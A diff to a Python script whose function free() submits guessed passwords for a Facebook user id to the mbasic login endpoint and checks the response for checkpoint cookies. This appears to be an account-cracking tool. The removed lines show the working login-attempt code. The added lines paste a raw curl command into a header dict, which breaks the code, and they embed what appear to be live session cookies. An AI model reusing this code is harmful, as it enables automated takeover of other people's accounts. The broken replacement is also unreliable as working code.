@@ -714,15 +714,23 @@ def free(idf,pwv):
 
 			pw = pw.lower()
 
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-
-			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
-
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
-
-			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
+			ses.headers.update({"Host":'https://https://free.facebook.com/' \
+  -H 'authority: free.facebook.com' \
+  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
+  -H 'cache-control: max-age=0' \
+  -H 'cookie: datr=2KcuZDv4aTL5Zq4-UaRwtBTq; sb=2KcuZEWQh7e2HC3NDO_3ZRsI; locale=en_GB; vpd=1405x720x1.3562500476837158; zsh=ASQVFeGNZolqA7fpODHimfs-n12XMcVKGxiN-1xtplzDx4XXuAsr-m8_C_5vryEAM3YPGeQZ6zZj1xjrGhsM1j0KtpdIL0_j9pOj_zMtoPU5DYCwCXA4u2tlCp87aWxzFG3Vex-pgUBIyawjt-2bqs5voI-QOP8FjM_Iy4AmFnfylBOvTdtoyaW5Yw0R0_Uw9UtN2E0pB5bItAR1-Opd-6ylRPQ6xvl8IzEKQXdQdcY6eHJ7upej1sM0BMcGlGAdu4SMoYvcRo6FWeaQzqmCJRRShcvzWmlNhtEczY1Pn0p3I9hBNxRLyX1oFRSdtGWQUQ; m_pixel_ratio=1.3562500476837158; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZZWHZ2VmltSmgxTDE2bXhseC02a2RRTC01MDhKQmJtUVBuUVBoNGIzcV9UcUZGQ0xQdVp6ZkdrZjF0X19WVk1JRSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZllYdnZWaW1KaDFMMTZteGx4LTZrZFFMLTUwOEpCYm1RUG5RUGg0YjNxX1RxRkZDTFB1WnpmR2tmMXRfX1ZWTUlFIiwicyI6Im1vYmlsZSJ9; wd=532x1037; oo=v1; fr=00iIqkBl3AyeOyZfy..BkNGdg.BJ.AAA.0.0.BkNGfq.AWVvXLpf3qc' \
+  -H 'sec-ch-ua: "(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-model: "dandelion"' \
+  -H 'sec-ch-ua-platform: "macOS"' \
+  -H 'sec-fetch-dest: document' \
+  -H 'sec-fetch-mode: navigate' \
+  -H 'sec-fetch-site: none' \
+  -H 'sec-fetch-user: ?1' \
+  -H 'upgrade-insecure-requests: 1' \
+  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5664.223 Safari/537.36' \
+  --compressed)
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
